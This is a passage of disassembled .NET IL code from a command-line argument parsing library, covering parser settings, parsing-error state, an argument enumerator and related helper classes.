    .set instance void CommandLine.ParsingError::set_ViolatesFormat(bool)
  } // end of property ParsingError::ViolatesFormat
  .property instance bool ViolatesMutualExclusiveness()
  {
    .get instance bool CommandLine.ParsingError::get_ViolatesMutualExclusiveness()
    .set instance void CommandLine.ParsingError::set_ViolatesMutualExclusiveness(bool)
  } // end of property ParsingError::ViolatesMutualExclusiveness
} // end of class CommandLine.ParsingError

.class public auto ansi sealed beforefieldinit CommandLine.PostParsingState
       extends [mscorlib]System.Object
{
  .field private class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> '<Errors>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::.ctor()
    IL_000c:  call       instance void CommandLine.PostParsingState::set_Errors(class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>)
    IL_0011:  ret
  } // end of method PostParsingState::.ctor

  .method public hidebysig specialname instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> 
          get_Errors() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::'<Errors>k__BackingField'
    IL_0006:  ret
  } // end of method PostParsingState::get_Errors

  .method private hidebysig specialname instance void 
          set_Errors(class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::'<Errors>k__BackingField'
    IL_0007:  ret
  } // end of method PostParsingState::set_Errors

  .property instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>
          Errors()
  {
    .get instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::get_Errors()
    .set instance void CommandLine.PostParsingState::set_Errors(class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>)
  } // end of property PostParsingState::Errors
} // end of class CommandLine.PostParsingState

.class private auto ansi sealed beforefieldinit CommandLine.StringArrayEnumerator
       extends [mscorlib]System.Object
       implements CommandLine.IArgumentEnumerator,
                  [mscorlib]System.IDisposable
{
  .field private initonly string[] _data
  .field private int32 _index
  .field private initonly int32 _endIndex
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string[] 'value') cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "value"
    IL_000c:  call       void CommandLine.Assumes::NotNull<string[]>(!!0,
                                                                     string)
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      string[] CommandLine.StringArrayEnumerator::_data
    IL_0018:  ldarg.0
    IL_0019:  ldc.i4.m1
    IL_001a:  stfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_001f:  ldarg.0
    IL_0020:  ldarg.1
    IL_0021:  ldlen
    IL_0022:  conv.i4
    IL_0023:  stfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_0028:  ret
  } // end of method StringArrayEnumerator::.ctor

  .method public hidebysig newslot specialname virtual final 
          instance string  get_Current() cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0006:  ldc.i4.m1
    IL_0007:  bne.un     IL_0012

    IL_000c:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0011:  throw

    IL_0012:  ldarg.0
    IL_0013:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0018:  ldarg.0
    IL_0019:  ldfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_001e:  blt        IL_0029

    IL_0023:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0028:  throw

    IL_0029:  ldarg.0
    IL_002a:  ldfld      string[] CommandLine.StringArrayEnumerator::_data
    IL_002f:  ldarg.0
    IL_0030:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0035:  ldelem     [mscorlib]System.String
    IL_003a:  ret
  } // end of method StringArrayEnumerator::get_Current

  .method public hidebysig newslot specialname virtual final 
          instance string  get_Next() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  4
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0006:  ldc.i4.m1
    IL_0007:  bne.un     IL_0012

    IL_000c:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0011:  throw

    IL_0012:  ldarg.0
    IL_0013:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0018:  ldarg.0
    IL_0019:  ldfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_001e:  ble        IL_0029

    IL_0023:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0028:  throw

    IL_0029:  ldarg.0
    IL_002a:  call       instance bool CommandLine.StringArrayEnumerator::get_IsLast()
    IL_002f:  brfalse    IL_0036

    IL_0034:  ldnull
    IL_0035:  ret

    IL_0036:  ldarg.0
    IL_0037:  ldfld      string[] CommandLine.StringArrayEnumerator::_data
    IL_003c:  ldarg.0
    IL_003d:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0042:  ldc.i4.1
    IL_0043:  add
    IL_0044:  ldelem     [mscorlib]System.String
    IL_0049:  ret
  } // end of method StringArrayEnumerator::get_Next

  .method public hidebysig newslot specialname virtual final 
          instance bool  get_IsLast() cil managed
  {
    // Code size       17 (0x11)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0006:  ldarg.0
    IL_0007:  ldfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_000c:  ldc.i4.1
    IL_000d:  sub
    IL_000e:  ceq
    IL_0010:  ret
  } // end of method StringArrayEnumerator::get_IsLast

  .method public hidebysig instance void 
          Reset() cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.m1
    IL_0002:  stfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0007:  ret
  } // end of method StringArrayEnumerator::Reset

  .method public hidebysig newslot virtual final 
          instance bool  MoveNext() cil managed
  {
    // Code size       48 (0x30)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0006:  ldarg.0
    IL_0007:  ldfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_000c:  bge        IL_002e

    IL_0011:  ldarg.0
    IL_0012:  dup
    IL_0013:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0018:  ldc.i4.1
    IL_0019:  add
    IL_001a:  stfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_001f:  ldarg.0
    IL_0020:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0025:  ldarg.0
    IL_0026:  ldfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_002b:  clt
    IL_002d:  ret

    IL_002e:  ldc.i4.0
    IL_002f:  ret
  } // end of method StringArrayEnumerator::MoveNext

  .method public hidebysig newslot virtual final 
          instance string  GetRemainingFromNext() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  newobj     instance void [mscorlib]System.NotSupportedException::.ctor()
    IL_0005:  throw
  } // end of method StringArrayEnumerator::GetRemainingFromNext

  .method public hidebysig newslot virtual final 
          instance bool  MovePrevious() cil managed
  {
    // Code size       69 (0x45)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0006:  ldc.i4.0
    IL_0007:  bgt        IL_0012

    IL_000c:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0011:  throw

    IL_0012:  ldarg.0
    IL_0013:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0018:  ldarg.0
    IL_0019:  ldfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_001e:  bgt        IL_0043

    IL_0023:  ldarg.0
    IL_0024:  dup
    IL_0025:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_002a:  ldc.i4.1
    IL_002b:  sub
    IL_002c:  stfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0031:  ldarg.0
    IL_0032:  ldfld      int32 CommandLine.StringArrayEnumerator::_index
    IL_0037:  ldarg.0
    IL_0038:  ldfld      int32 CommandLine.StringArrayEnumerator::_endIndex
    IL_003d:  cgt
    IL_003f:  ldc.i4.0
    IL_0040:  ceq
    IL_0042:  ret

    IL_0043:  ldc.i4.0
    IL_0044:  ret
  } // end of method StringArrayEnumerator::MovePrevious

  .method private hidebysig newslot virtual final 
          instance void  System.IDisposable.Dispose() cil managed
  {
    .override [mscorlib]System.IDisposable::Dispose
    // Code size       1 (0x1)
    .maxstack  8
    IL_0000:  ret
  } // end of method StringArrayEnumerator::System.IDisposable.Dispose

  .property instance string Current()
  {
    .get instance string CommandLine.StringArrayEnumerator::get_Current()
  } // end of property StringArrayEnumerator::Current
  .property instance string Next()
  {
    .get instance string CommandLine.StringArrayEnumerator::get_Next()
  } // end of property StringArrayEnumerator::Next
  .property instance bool IsLast()
  {
    .get instance bool CommandLine.StringArrayEnumerator::get_IsLast()
  } // end of property StringArrayEnumerator::IsLast
} // end of class CommandLine.StringArrayEnumerator

.class private auto ansi beforefieldinit CommandLine.TargetWrapper
       extends [mscorlib]System.Object
{
  .field private initonly object _target
  .field private initonly class [mscorlib]System.Collections.Generic.IList`1<string> _valueList
  .field private initonly class CommandLine.ValueListAttribute _vla
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(object target) cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  stfld      object CommandLine.TargetWrapper::_target
    IL_000d:  ldarg.0
    IL_000e:  ldarg.0
    IL_000f:  ldfld      object CommandLine.TargetWrapper::_target
    IL_0014:  call       class CommandLine.ValueListAttribute CommandLine.ValueListAttribute::GetAttribute(object)
    IL_0019:  stfld      class CommandLine.ValueListAttribute CommandLine.TargetWrapper::_vla
    IL_001e:  ldarg.0
    IL_001f:  call       instance bool CommandLine.TargetWrapper::get_IsValueListDefined()
    IL_0024:  brfalse    IL_003a

    IL_0029:  ldarg.0
    IL_002a:  ldarg.0
    IL_002b:  ldfld      object CommandLine.TargetWrapper::_target
    IL_0030:  call       class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.ValueListAttribute::GetReference(object)
    IL_0035:  stfld      class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.TargetWrapper::_valueList
    IL_003a:  ret
  } // end of method TargetWrapper::.ctor

  .method public hidebysig specialname instance bool 
          get_IsValueListDefined() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.ValueListAttribute CommandLine.TargetWrapper::_vla
    IL_0006:  ldnull
    IL_0007:  ceq
    IL_0009:  ldc.i4.0
    IL_000a:  ceq
    IL_000c:  ret
  } // end of method TargetWrapper::get_IsValueListDefined

  .method public hidebysig instance bool 
          AddValueItemIfAllowed(string item) cil managed
  {
    // Code size       79 (0x4f)
    .maxstack  8
    .locals init ([0] class CommandLine.TargetWrapper V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.ValueListAttribute CommandLine.TargetWrapper::_vla
    IL_0006:  callvirt   instance int32 CommandLine.ValueListAttribute::get_MaximumElements()
    IL_000b:  brfalse    IL_002b

    IL_0010:  ldarg.0
    IL_0011:  ldfld      class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.TargetWrapper::_valueList
    IL_0016:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<string>::get_Count()
    IL_001b:  ldarg.0
    IL_001c:  ldfld      class CommandLine.ValueListAttribute CommandLine.TargetWrapper::_vla
    IL_0021:  callvirt   instance int32 CommandLine.ValueListAttribute::get_MaximumElements()
    IL_0026:  bne.un     IL_002d

    IL_002b:  ldc.i4.0
    IL_002c:  ret

    IL_002d:  ldarg.0
    IL_002e:  dup
    IL_002f:  stloc.0
    IL_0030:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      IL_0035:  ldarg.0
      IL_0036:  ldfld      class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.TargetWrapper::_valueList
      IL_003b:  ldarg.1
      IL_003c:  callvirt   instance void class [mscorlib]System.Collections.Generic.ICollection`1<string>::Add(!0)
      IL_0041:  leave      IL_004d

    }  // end .try
    finally
    {
      IL_0046:  ldloc.0
      IL_0047:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_004c:  endfinally
    }  // end handler
    IL_004d:  ldc.i4.1
    IL_004e:  ret
  } // end of method TargetWrapper::AddValueItemIfAllowed

  .property instance bool IsValueListDefined()
  {
    .get instance bool CommandLine.TargetWrapper::get_IsValueListDefined()
  } // end of property TargetWrapper::IsValueListDefined
} // end of class CommandLine.TargetWrapper

.class interface public abstract auto ansi CommandLine.ICommandLineParser
{
  .method public hidebysig newslot abstract virtual 
          instance bool  ParseArguments(string[] args,
                                        object options) cil managed
  {
  } // end of method ICommandLineParser::ParseArguments

  .method public hidebysig newslot abstract virtual 
          instance bool  ParseArguments(string[] args,
                                        object options,
                                        class [mscorlib]System.IO.TextWriter helpWriter) cil managed
  {
  } // end of method ICommandLineParser::ParseArguments

} // end of class CommandLine.ICommandLineParser

.class public abstract auto ansi beforefieldinit CommandLine.CommandLineOptionsBase
       extends [mscorlib]System.Object
{
  .field private class CommandLine.PostParsingState '<LastPostParsingState>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method family hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  newobj     instance void CommandLine.PostParsingState::.ctor()
    IL_000c:  call       instance void CommandLine.CommandLineOptionsBase::set_LastPostParsingState(class CommandLine.PostParsingState)
    IL_0011:  ret
  } // end of method CommandLineOptionsBase::.ctor

  .method family hidebysig specialname instance class CommandLine.PostParsingState 
          get_LastPostParsingState() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::'<LastPostParsingState>k__BackingField'
    IL_0006:  ret
  } // end of method CommandLineOptionsBase::get_LastPostParsingState

  .method private hidebysig specialname instance void 
          set_LastPostParsingState(class CommandLine.PostParsingState 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::'<LastPostParsingState>k__BackingField'
    IL_0007:  ret
  } // end of method CommandLineOptionsBase::set_LastPostParsingState

  .method assembly hidebysig specialname 
          instance class CommandLine.PostParsingState 
          get_InternalLastPostParsingState() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_LastPostParsingState()
    IL_0006:  ret
  } // end of method CommandLineOptionsBase::get_InternalLastPostParsingState

  .property instance class CommandLine.PostParsingState
          LastPostParsingState()
  {
    .get instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_LastPostParsingState()
    .set instance void CommandLine.CommandLineOptionsBase::set_LastPostParsingState(class CommandLine.PostParsingState)
  } // end of property CommandLineOptionsBase::LastPostParsingState
  .property instance class CommandLine.PostParsingState
          InternalLastPostParsingState()
  {
    .get instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_InternalLastPostParsingState()
  } // end of property CommandLineOptionsBase::InternalLastPostParsingState
} // end of class CommandLine.CommandLineOptionsBase

.class public auto ansi serializable sealed beforefieldinit CommandLine.CommandLineParserException
       extends [mscorlib]System.Exception
{
  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Exception::.ctor()
    IL_0006:  ret
  } // end of method CommandLineParserException::.ctor

  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor(string message) cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  call       instance void [mscorlib]System.Exception::.ctor(string)
    IL_0007:  ret
  } // end of method CommandLineParserException::.ctor

  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor(string message,
                               class [mscorlib]System.Exception innerException) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void [mscorlib]System.Exception::.ctor(string,
                                                                         class [mscorlib]System.Exception)
    IL_0008:  ret
  } // end of method CommandLineParserException::.ctor

  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor(class [mscorlib]System.Runtime.Serialization.SerializationInfo info,
                               valuetype [mscorlib]System.Runtime.Serialization.StreamingContext context) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void [mscorlib]System.Exception::.ctor(class [mscorlib]System.Runtime.Serialization.SerializationInfo,
                                                                         valuetype [mscorlib]System.Runtime.Serialization.StreamingContext)
    IL_0008:  ret
  } // end of method CommandLineParserException::.ctor

} // end of class CommandLine.CommandLineParserException

.class public auto ansi sealed beforefieldinit CommandLine.CommandLineParserSettings
       extends [mscorlib]System.Object
{
  .field private static literal bool CASE_SENSITIVE_DEFAULT = bool(true)
  .field private bool '<CaseSensitive>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool '<MutuallyExclusive>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private class [mscorlib]System.IO.TextWriter '<HelpWriter>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool '<IgnoreUnknownArguments>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.1
    IL_0002:  call       instance void CommandLine.CommandLineParserSettings::.ctor(bool)
    IL_0007:  ret
  } // end of method CommandLineParserSettings::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool caseSensitive) cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.CommandLineParserSettings::set_CaseSensitive(bool)
    IL_000d:  ret
  } // end of method CommandLineParserSettings::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class [mscorlib]System.IO.TextWriter helpWriter) cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.1
    IL_0002:  call       instance void CommandLine.CommandLineParserSettings::.ctor(bool)
    IL_0007:  ldarg.0
    IL_0008:  ldarg.1
    IL_0009:  call       instance void CommandLine.CommandLineParserSettings::set_HelpWriter(class [mscorlib]System.IO.TextWriter)
    IL_000e:  ret
  } // end of method CommandLineParserSettings::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool caseSensitive,
                               class [mscorlib]System.IO.TextWriter helpWriter) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.CommandLineParserSettings::set_CaseSensitive(bool)
    IL_000d:  ldarg.0
    IL_000e:  ldarg.2
    IL_000f:  call       instance void CommandLine.CommandLineParserSettings::set_HelpWriter(class [mscorlib]System.IO.TextWriter)
    IL_0014:  ret
  } // end of method CommandLineParserSettings::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool caseSensitive,
                               bool mutuallyExclusive) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.CommandLineParserSettings::set_CaseSensitive(bool)
    IL_000d:  ldarg.0
    IL_000e:  ldarg.2
    IL_000f:  call       instance void CommandLine.CommandLineParserSettings::set_MutuallyExclusive(bool)
    IL_0014:  ret
  } // end of method CommandLineParserSettings::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool caseSensitive,
                               bool mutuallyExclusive,
                               class [mscorlib]System.IO.TextWriter helpWriter) cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  9
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.CommandLineParserSettings::set_CaseSensitive(bool)
    IL_000d:  ldarg.0
    IL_000e:  ldarg.2
    IL_000f:  call       instance void CommandLine.CommandLineParserSettings::set_MutuallyExclusive(bool)
    IL_0014:  ldarg.0
    IL_0015:  ldarg.3
    IL_0016:  call       instance void CommandLine.CommandLineParserSettings::set_HelpWriter(class [mscorlib]System.IO.TextWriter)
    IL_001b:  ret
  } // end of method CommandLineParserSettings::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool caseSensitive,
                               bool mutuallyExclusive,
                               bool ignoreUnknownArguments,
                               class [mscorlib]System.IO.TextWriter helpWriter) cil managed
  {
    // Code size       36 (0x24)
    .maxstack  11
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.CommandLineParserSettings::set_CaseSensitive(bool)
    IL_000d:  ldarg.0
    IL_000e:  ldarg.2
    IL_000f:  call       instance void CommandLine.CommandLineParserSettings::set_MutuallyExclusive(bool)
    IL_0014:  ldarg.0
    IL_0015:  ldarg.s    helpWriter
    IL_0017:  call       instance void CommandLine.CommandLineParserSettings::set_HelpWriter(class [mscorlib]System.IO.TextWriter)
    IL_001c:  ldarg.0
    IL_001d:  ldarg.3
    IL_001e:  call       instance void CommandLine.CommandLineParserSettings::set_IgnoreUnknownArguments(bool)
    IL_0023:  ret
  } // end of method CommandLineParserSettings::.ctor

  .method assembly hidebysig specialname 
          instance bool  get_CaseSensitive() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.CommandLineParserSettings::'<CaseSensitive>k__BackingField'
    IL_0006:  ret
  } // end of method CommandLineParserSettings::get_CaseSensitive

  .method public hidebysig specialname instance void 
          set_CaseSensitive(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.CommandLineParserSettings::'<CaseSensitive>k__BackingField'
    IL_0007:  ret
  } // end of method CommandLineParserSettings::set_CaseSensitive

  .method assembly hidebysig specialname 
          instance bool  get_MutuallyExclusive() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.CommandLineParserSettings::'<MutuallyExclusive>k__BackingField'
    IL_0006:  ret
  } // end of method CommandLineParserSettings::get_MutuallyExclusive

  .method public hidebysig specialname instance void 
          set_MutuallyExclusive(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.CommandLineParserSettings::'<MutuallyExclusive>k__BackingField'
    IL_0007:  ret
  } // end of method CommandLineParserSettings::set_MutuallyExclusive

  .method assembly hidebysig specialname 
          instance class [mscorlib]System.IO.TextWriter 
          get_HelpWriter() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.IO.TextWriter CommandLine.CommandLineParserSettings::'<HelpWriter>k__BackingField'
    IL_0006:  ret
  } // end of method CommandLineParserSettings::get_HelpWriter

  .method public hidebysig specialname instance void 
          set_HelpWriter(class [mscorlib]System.IO.TextWriter 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class [mscorlib]System.IO.TextWriter CommandLine.CommandLineParserSettings::'<HelpWriter>k__BackingField'
    IL_0007:  ret
  } // end of method CommandLineParserSettings::set_HelpWriter

  .method assembly hidebysig specialname 
          instance bool  get_IgnoreUnknownArguments() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.CommandLineParserSettings::'<IgnoreUnknownArguments>k__BackingField'
    IL_0006:  ret
  } // end of method CommandLineParserSettings::get_IgnoreUnknownArguments

  .method public hidebysig specialname instance void 
          set_IgnoreUnknownArguments(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.CommandLineParserSettings::'<IgnoreUnknownArguments>k__BackingField'
    IL_0007:  ret
  } // end of method CommandLineParserSettings::set_IgnoreUnknownArguments

  .property instance bool CaseSensitive()
  {
    .get instance bool CommandLine.CommandLineParserSettings::get_CaseSensitive()
    .set instance void CommandLine.CommandLineParserSettings::set_CaseSensitive(bool)
  } // end of property CommandLineParserSettings::CaseSensitive
  .property instance bool MutuallyExclusive()
  {
    .get instance bool CommandLine.CommandLineParserSettings::get_MutuallyExclusive()
    .set instance void CommandLine.CommandLineParserSettings::set_MutuallyExclusive(bool)
  } // end of property CommandLineParserSettings::MutuallyExclusive
  .property instance class [mscorlib]System.IO.TextWriter
          HelpWriter()
  {
    .get instance class [mscorlib]System.IO.TextWriter CommandLine.CommandLineParserSettings::get_HelpWriter()
    .set instance void CommandLine.CommandLineParserSettings::set_HelpWriter(class [mscorlib]System.IO.TextWriter)
  } // end of property CommandLineParserSettings::HelpWriter
  .property instance bool IgnoreUnknownArguments()
  {
    .get instance bool CommandLine.CommandLineParserSettings::get_IgnoreUnknownArguments()
    .set instance void CommandLine.CommandLineParserSettings::set_IgnoreUnknownArguments(bool)
  } // end of property CommandLineParserSettings::IgnoreUnknownArguments
} // end of class CommandLine.CommandLineParserSettings

.class public auto ansi beforefieldinit CommandLine.CommandLineParser
       extends [mscorlib]System.Object
       implements CommandLine.ICommandLineParser
